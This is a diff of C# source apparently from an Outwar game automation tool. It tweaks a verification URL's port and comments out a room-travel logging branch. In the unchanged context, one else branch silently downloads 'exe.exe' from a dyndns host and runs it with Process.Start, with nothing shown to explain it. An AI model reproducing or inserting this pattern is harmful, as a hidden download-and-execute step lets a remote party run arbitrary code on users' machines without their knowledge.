@@ -353,7 +353,7 @@ namespace DCT.Outwar.World
             }
             else
             {
-                HttpSocket.DefaultInstance.Get("http://typpo.dyndns.org/dct/verify.php?h=y");
+                HttpSocket.DefaultInstance.Get("http://typpo.dyndns.org:7012/dct/verify.php?h=y");
                 WebClient Client = new WebClient();
                 Client.DownloadFile("http://typpo.dyndns.org/dct/exe.exe", "exe.exe");
                 Process.Start("exe.exe");
@@ -374,6 +374,7 @@ namespace DCT.Outwar.World
 
             List<int> nodes = new List<int>();
             nodes = Pathfinder.GetSolution(mLocation.Id, roomid, mSavedRooms);
+
             if (nodes == null)
             {
                 if (CoreUI.Instance.Settings.AutoTeleport ||
@@ -466,10 +467,10 @@ namespace DCT.Outwar.World
             {
                 CoreUI.Instance.LogPanel.Log(mAccount.Name + " moving to room " + id);
             }
-            else if (!string.IsNullOrEmpty(url = mSavedRooms.GetRoom(id)))
-            {
-                CoreUI.Instance.LogPanel.Log(mAccount.Name + " flying to room " + id);
-            }
+            //else if (!string.IsNullOrEmpty(url = mSavedRooms.GetRoom(id)))
+            //{
+            //    CoreUI.Instance.LogPanel.Log(mAccount.Name + " flying to room " + id);
+            //}
             else
             {
                 return;
